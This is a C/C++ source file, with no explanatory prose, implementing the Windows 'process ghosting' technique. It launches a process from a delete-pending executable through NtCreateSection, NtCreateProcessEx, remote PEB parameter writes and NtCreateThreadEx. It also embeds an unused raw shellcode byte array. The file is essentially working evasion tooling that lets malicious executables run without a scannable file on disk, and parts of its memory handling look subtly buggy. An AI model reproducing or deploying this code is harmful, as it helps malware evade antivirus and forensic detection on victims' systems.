
#define RTL_USER_PROC_PARAMS_NORMALIZED     0x00000001

typedef struct _CURDIR
{
	UNICODE_STRING DosPath;
	HANDLE Handle;

} CURDIR, * PCURDIR;

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
	USHORT Flags;
	USHORT Length;
	ULONG  TimeStamp;
	STRING DosPath;

} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;


typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	ULONG MaximumLength;                            // Should be set before call RtlCreateProcessParameters
	ULONG Length;                                   // Length of valid structure
	ULONG Flags;                                    // Currently only PPF_NORMALIZED (1) is known:
													//  - Means that structure is normalized by call RtlNormalizeProcessParameters
	ULONG DebugFlags;

	PVOID ConsoleHandle;                            // HWND to console window associated with process (if any).
	ULONG ConsoleFlags;
	HANDLE StandardInput;
	HANDLE StandardOutput;
	HANDLE StandardError;

	CURDIR CurrentDirectory;                        // Specified in DOS-like symbolic link path, ex: "C:/WinNT/SYSTEM32"
	UNICODE_STRING DllPath;                         // DOS-like paths separated by ';' where system should search for DLL files.
	UNICODE_STRING ImagePathName;                   // Full path in DOS-like format to process'es file image.
	UNICODE_STRING CommandLine;                     // Command line
	PVOID Environment;                              // Pointer to environment block (see RtlCreateEnvironment)
	ULONG StartingX;
	ULONG StartingY;
	ULONG CountX;
	ULONG CountY;
	ULONG CountCharsX;
	ULONG CountCharsY;
	ULONG FillAttribute;                            // Fill attribute for console window
	ULONG WindowFlags;
	ULONG ShowWindowFlags;
	UNICODE_STRING WindowTitle;
	UNICODE_STRING DesktopInfo;                     // Name of WindowStation and Desktop objects, where process is assigned
	UNICODE_STRING ShellInfo;
	UNICODE_STRING RuntimeData;
	RTL_DRIVE_LETTER_CURDIR CurrentDirectores[0x20];
	ULONG EnvironmentSize;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef NTSTATUS (NTAPI* _RTLCREATEPROCESSPARAMETERSEX)(
	PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
	PUNICODE_STRING ImagePathName,
	PUNICODE_STRING DllPath,
	PUNICODE_STRING CurrentDirectory,
	PUNICODE_STRING CommandLine,
	PVOID Environment,
	PUNICODE_STRING WindowTitle,
	PUNICODE_STRING DesktopInfo,
	PUNICODE_STRING ShellInfo,
	PUNICODE_STRING RuntimeData,
	ULONG Flags);

typedef NTSTATUS (NTAPI* _NtCreateSection)(
	PHANDLE SectionHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	PLARGE_INTEGER MaximumSize OPTIONAL,
	ULONG SectionPageProtection,
	ULONG AllocationAttributes,
	HANDLE FileHandle OPTIONAL);


typedef NTSTATUS (NTAPI *_NtCreateProcessEx)(
	PHANDLE ProcessHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	HANDLE ParentProcess,
	ULONG Flags,
	HANDLE SectionHandle,
	HANDLE DebugPort,
	HANDLE ExceptionPort,
	ULONG JobMemberLevel);

typedef struct _PS_ATTRIBUTE
{
	ULONG  Attribute;
	SIZE_T Size;
	union
	{
		ULONG Value;
		PVOID ValuePtr;
	} u1;
	PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T       TotalLength;
	PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

typedef NTSTATUS (NTAPI* _NtCreateThreadEx)(
	PHANDLE ThreadHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	HANDLE ProcessHandle,
	PVOID StartRoutine,
	PVOID Argument,
	ULONG CreateFlags,
	SIZE_T ZeroBits,
	SIZE_T StackSize,
	SIZE_T MaximumStackSize,
	PPS_ATTRIBUTE_LIST AttributeList);

int main(int argc, char* argv[]) {

// MessageBoxA shellcode (https://gist.github.com/kkent030315/b508e56a5cb0e3577908484fa4978f12)
	char asd[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
		"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
		"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
		"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
		"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
		"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
		"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
		"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
		"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
		"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
		"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
		"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
		"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
		"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
		"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
		"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
		"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
		"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
		"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
		"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
		"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
		"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
		"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
		"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
		"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
		"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
		"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
		"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
		"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

	
	_NtCreateSection NtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandle(L"ntdll"), "NtCreateSection");
	_NtCreateProcessEx NtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(GetModuleHandle(L"ntdll"), "NtCreateProcessEx");
	_NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandle(L"ntdll"), "NtCreateThreadEx");
	_RTLCREATEPROCESSPARAMETERSEX RtlCreateProcessParametersEx = (_RTLCREATEPROCESSPARAMETERSEX)GetProcAddress(GetModuleHandle(L"ntdll"), "RtlCreateProcessParametersEx");
	

	HANDLE sectHandle, hFile, hProc = NULL;

	FILE_DISPOSITION_INFO fdi;
	fdi.DeleteFileW = TRUE;

	hFile = CreateFile(L"C:\\YourPath\\To\\File\\shit.exe", DELETE | GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,NULL);

	if (!hFile) {
		printf("hFile error: %d\n", GetLastError());
		return -1;
	}

	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &fdi, sizeof(fdi)))
	{
		printf("setfileInfo error: %d\n", GetLastError());
		return -1;
	}

	if (NtCreateSection(&sectHandle, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile)) {
		printf("createsection error: %d\n", GetLastError());
		return -1;
	}

	CloseHandle(hFile);
	
	if (NtCreateProcessEx(&hProc, PROCESS_ALL_ACCESS, NULL, (HANDLE)-1, HANDLE_FLAG_INHERIT, sectHandle, NULL, NULL, 0)) {
		printf("createprocess error: %d\n", GetLastError());
		return -1;
	};

	HANDLE th = NULL;

	PROCESS_BASIC_INFORMATION pbi;

	NtQueryInformationProcess(hProc, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);

	PPEB rPeb = (PPEB)pbi.PebBaseAddress;
	printf("PEB: %p\n", rPeb);

	PVOID* imageBase = &rPeb->ImageBaseAddress;
	PVOID addr = NULL;
	ReadProcessMemory(hProc, imageBase, &addr, 8, NULL);

	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)addr;

	LONG e_lfanew;
	ReadProcessMemory(hProc, (char*)dos + offsetof(IMAGE_DOS_HEADER, e_lfanew), &e_lfanew, sizeof(LONG), NULL);

	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((DWORD_PTR)addr + e_lfanew);

	DWORD addrOfEntry;
	ReadProcessMemory(hProc, (char*)nt + offsetof(IMAGE_NT_HEADERS, OptionalHeader.AddressOfEntryPoint), &addrOfEntry, sizeof(DWORD), NULL);

	printf("addrOfEntry: %p\n", addrOfEntry);

	printf("image base: %p\n", dos);
	PVOID entry = (PVOID)((DWORD_PTR)dos + addrOfEntry);
	printf("entry: %p\n", entry);



	UNICODE_STRING ustr;
	RtlInitUnicodeString(&ustr, L"\\??\\C:\\Windows\\System32\\notepad.exe");
	
	wchar_t wzDirPath[MAX_PATH] = { 0 };
	GetCurrentDirectoryW(MAX_PATH, wzDirPath);

	UNICODE_STRING uCurrentDir = { 0 };
	RtlInitUnicodeString(&uCurrentDir, wzDirPath);
	
	UNICODE_STRING uDllDir = { 0 };
	RtlInitUnicodeString(&uDllDir, L"C:\\Windows\\System32");
	
	UNICODE_STRING uWindowName = { 0 };
	RtlInitUnicodeString(&uWindowName, L"testin bitches");

	LPVOID lpEnv;

	CreateEnvironmentBlock(&lpEnv, NULL, TRUE);

	PRTL_USER_PROCESS_PARAMETERS param;
	RtlCreateProcessParametersEx(&param, (PUNICODE_STRING)&ustr, (PUNICODE_STRING)&uDllDir,
		(PUNICODE_STRING)&uCurrentDir,
		(PUNICODE_STRING)&ustr,
		lpEnv,
		(PUNICODE_STRING)&uWindowName,
		NULL,
		NULL,
		NULL,
		RTL_USER_PROC_PARAMS_NORMALIZED);

	
	PRTL_USER_PROCESS_PARAMETERS* rParam = &rPeb->ProcessParameters;
	printf("rParam: %p\n", rParam);
	
	if (!WriteProcessMemory(hProc, rParam, param, sizeof(param), NULL)) {
		printf("WPM ERROR: %d\n", GetLastError());
	}


	// write to process
	PVOID buffer = param;
  printf("param: %p\n", param);
	printf("buffer: %p\n", buffer);
	printf("length: %d\n", param->Length);
	printf("envsize: %d\n", param->EnvironmentSize);

	if (VirtualAllocEx(hProc, buffer, param->Length * 20, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
		if (!WriteProcessMemory(hProc, (LPVOID)param, (LPVOID)param, param->Length, NULL)) {
			std::cerr << "Writing RemoteProcessParams failed" << std::endl;
			return -1;
		}
		
		printf("param env: %p\n", param->Environment);
		if (param->Environment) {
			if (!WriteProcessMemory(hProc, param->Environment, param->Environment, param->EnvironmentSize, NULL)) {
				printf("Writing environment failed %d", GetLastError());
				getchar();
				
			}
		}
	}
  
  // nervewrecking part, thanks for hasherezade
  
	if (!WriteProcessMemory(hProc, (LPVOID)param, (LPVOID)param, param->Length, NULL)) {
		printf("Writing RemoteProcessParams failed %d\n", GetLastError());
		getchar();
	}
	if (param->Environment) {
		if (!VirtualAllocEx(hProc, (LPVOID)param->Environment, param->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
			printf("Allocating environment failed %d\n", GetLastError());
			getchar();
		}
		if (!WriteProcessMemory(hProc, (LPVOID)param->Environment, (LPVOID)param->Environment, param->EnvironmentSize, NULL)) {
			printf("Writing environment failed %d\n", GetLastError());
			getchar();
		}
	}

	// write to PEB
	if (!WriteProcessMemory(hProc, rParam, &param, sizeof(PVOID), NULL)) {
		printf("Failed - Cannot update Params! %d\n", GetLastError());
		return FALSE;
	}


	if (NtCreateThreadEx(&th, THREAD_ALL_ACCESS, NULL, hProc, entry, 0, FALSE, NULL, 0, 0, NULL)) {
		printf("createthread error: %d\n", GetLastError());
		return -1;
	}
	
	
	printf("CREATED\n");

}
